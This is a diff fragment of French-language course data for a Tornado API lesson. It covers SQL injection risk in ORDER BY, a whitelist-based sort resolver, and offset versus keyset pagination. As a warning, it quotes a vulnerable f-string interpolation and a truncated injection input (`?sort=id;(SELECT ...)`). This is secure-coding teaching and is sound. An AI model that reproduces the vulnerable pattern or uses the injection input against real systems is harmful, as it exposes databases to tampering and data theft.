-                    "Une API professionnelle permet au client de filtrer et trier les collections (`?domaine=Securite&duree_min=4&sort=-tarif_dzd`) :\n"
-                    "- **Danger d'injection SQL dans `ORDER BY`** : Les marqueurs paramétrés `?` de SQLite ne peuvent remplacer que des **valeurs** "
-                    "(`WHERE domaine = ?`), ils ne peuvent pas remplacer un **nom de colonne** dans `ORDER BY`.\n"
-                    "- Si un développeur écrit `f\"SELECT * FROM formations ORDER BY {self.get_query_argument('sort')}\"`, il ouvre une **faille d'injection SQL critique** !\n"
-                    "- **La règle absolue de la Liste Blanche (*Whitelist*)** : Vérifiez toujours que le nom de colonne nettoyé appartient à un ensemble "
-                    "Python figé (`if cle_tri not in {\"id\", \"duree_jours\", \"tarif_dzd\", \"titre\"}: self.set_status(422) ...`) avant d'exécuter le tri."
+                    "Exposer le filtrage multi-critères (`?domaine=Securite&duree_min=3`) et le tri paramétrable "
+                    "(`?sort=-tarif_dzd`) introduit une frontière critique de sécurité SQL que tout ingénieur backend "
+                    "doit maîtriser sans hésitation.\n\n"
+                    "#### Limite structurelle des marqueurs liés (`?`) face aux identifiants SQL (`ORDER BY`)\n\n"
+                    "Dans le protocole de préparation des requêtes SQL (`sqlite3`, `psycopg`), les paramètres liés (`?` "
+                    "ou `$1`) ne peuvent se substituer **qu'à des littéraux de valeurs** dans les prédicats `WHERE "
+                    "domaine = ? AND duree_jours >= ?`. La grammaire SQL interdit qu'un marqueur lié représente un "
+                    "**identifiant de colonne** ou le mot-clé directionnel **`ASC` / `DESC`** dans `ORDER BY`. Tenter "
+                    "de contourner cette règle par interpolation directe `f\"ORDER BY {self.get_query_argument('sort')}\"` "
+                    "ouvre instantanément une **injection SQL critique** (par exemple via `?sort=id;(SELECT ...)` ou des "
+                    "exfiltrations booléennes dans `CASE WHEN`).\n\n"
+                    "```python — Validation stricte par table de correspondance figée (Whitelist) dans Tornado\n"
+                    "COLONNES_TRI_SURES = {\n"
+                    "    \"id\": \"id\",\n"
+                    "    \"duree_jours\": \"duree_jours\",\n"
+                    "    \"tarif_dzd\": \"tarif_dzd\",\n"
+                    "    \"titre\": \"titre\",\n"
+                    "}\n\n"
+                    "def resoudre_clause_tri(param_sort: str) -> str:\n"
+                    "    direction = \"DESC\" if param_sort.startswith(\"-\") else \"ASC\"\n"
+                    "    nom_public = param_sort.lstrip(\"+-\")\n"
+                    "    colonne_sql = COLONNES_TRI_SURES.get(nom_public)\n"
+                    "    if colonne_sql is None:\n"
+                    "        raise ValueError(f\"Critere de tri non autorise : {nom_public}\")\n"
+                    "    return f\"{colonne_sql} {direction}, id ASC\"\n"
+                    "```\n\n"
+                    "> [!IMPORTANT] Déterminisme total du tri par clé de départage (`Tie-Breaker`)\n"
+                    "> Remarquez l'ajout systématique de `, id ASC` à la fin de `ORDER BY` : si trente formations "
+                    "partagent exactement le même `tarif_dzd`, l'ordre relatif de ces ex-aequo en SQL n'est **pas "
+                    "déterministe** d'une page à l'autre sans colonne de départage unique ! Adjoindre la clé primaire "
+                    "`id` en critère secondaire garantit un ordre mathématiquement total et exempt de tout saut ou "
+                    "doublon lors de la pagination."
                 )
             }
         ],
@@ -1218,7 +1885,7 @@ ENRICHMENT_D4_D5 = {
             "headers": ["Critère d'Ingénierie", "Pagination `Offset / Limit` (`?page=2&per_page=20`)", "Pagination `Curseur / Keyset` (`?after_id=1042&limit=20`)"],
             "rows": [
                 ["Requête SQL sous-jacente", "`SELECT * FROM table ORDER BY id LIMIT ? OFFSET ?`", "`SELECT * FROM table WHERE id > ? ORDER BY id LIMIT ?`"],
-                ["Complexité algorithmique SQL", "$O(N)$ — Ralentit à mesure que `OFFSET` augmente", "$O(1)$ — Temps constant ultra-rapide via l'index B-Tree"],
+                ["Complexité algorithmique SQL", "`O(N)` — Ralentit à mesure que `OFFSET` augmente", "`O(1)` — Temps constant ultra-rapide via l'index B-Tree"],
                 ["Saut direct vers une page (`Page 14`)", "Oui (idéal pour les grilles Web numérotées)", "Non (navigation séquentielle *Suivant / Précédent*)"],
                 ["Stabilité en cas d'insertion temps réel", "Risque de décalage (un élément peut apparaître 2 fois)", "100 % stable (ancré sur l'identifiant unique `after_id`)"]
             ]
@@ -1236,8 +1903,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez `day_5/02_pagination_filtrage_production.py` et observez comment `next_cursor` dans `/api/v1/catalogue/cursor` permet de parcourir toute la collection de 2 en 2 jusqu'à ce que `next_cursor` vaille `None`.",
-            "Ajoutez un paramètre `?fields=id,titre` (*Sparse Fieldsets*) qui permet au client de ne recevoir que les colonnes demandées pour économiser la bande passante mobile."
+            "Exécutez `day_5/02_pagination_filtrage_production.py` et parcourez la collection de proche en proche sur `/api/v1/catalogue/cursor` à l'aide de `next_cursor` en observant la technique `limit + 1` qui évite tout `SELECT COUNT(*)`.",
+            "Implémentez la projection partielle de champs (*Sparse Fieldsets*, `?fields=id,titre,tarif_dzd`) validée contre une liste blanche de colonnes autorisées afin de réduire de 70 % le volume JSON transmis aux terminaux mobiles sur réseau cellulaire contraint."
         ]
     }
 }
